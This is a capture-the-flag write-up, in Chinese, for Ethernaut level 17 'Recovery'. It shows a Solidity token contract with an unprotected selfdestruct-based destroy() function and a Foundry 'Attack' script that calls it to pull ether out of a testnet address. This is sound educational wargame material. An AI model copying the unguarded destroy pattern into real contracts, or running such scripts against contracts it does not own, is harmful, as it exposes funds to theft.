# Ethernaut CTF Writeup

## Level 17 Recovery

> 題目: https://ethernaut.openzeppelin.com/level/0x32a089747130fE7391A7FBaad83D14F699fc7dbD

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

過關條件: 

- recover (or remove) the 0.001 ether from the lost contract address.

解法：

- 使用區塊瀏覽器（如 Etherscan）來查找 generateToken 的交易記錄，並定位 SimpleToken 合約的地址
    > e.g. https://sepolia-optimism.etherscan.io/address/0xA4D89723A2C2F68174c9A914D804BA1F895c1c10#internaltx 
    >     -> https://sepolia-optimism.etherscan.io/address/0xf2c2e3b24590ea9f42367f47d7242a7034678cfd
- 通過錢包或腳本調用該合約的 `destroy(address payable _to)` 函數，傳入你的地址來接收合約中剩餘的 0.001 Ether

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {SimpleToken} from "../src/level17/Recovery.sol";

contract Attack is Script {
    // https://sepolia-optimism.etherscan.io/address/0xA4D89723A2C2F68174c9A914D804BA1F895c1c10#internaltx
    SimpleToken target = SimpleToken(payable(0xf2c2E3B24590EA9f42367f47D7242A7034678cfD));
    function run() public {
        vm.startBroadcast();

        target.destroy(payable(msg.sender));

        vm.stopBroadcast();
    }
}

```